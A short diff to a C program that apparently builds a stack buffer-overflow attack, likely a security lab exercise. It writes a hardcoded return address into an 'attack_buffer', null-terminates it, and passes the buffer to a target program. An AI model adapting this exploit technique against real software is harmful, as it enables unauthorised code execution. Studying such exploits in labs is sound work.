@@ -24,6 +24,7 @@ main ( int argc, char * argv[] )
 
 	int * ret_address = (int*)&attack_buffer[BUF_TO_RET];
 	*ret_address = 0x2021fe10;
+	attack_buffer[BUF_SIZE - 1] = '\0';
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
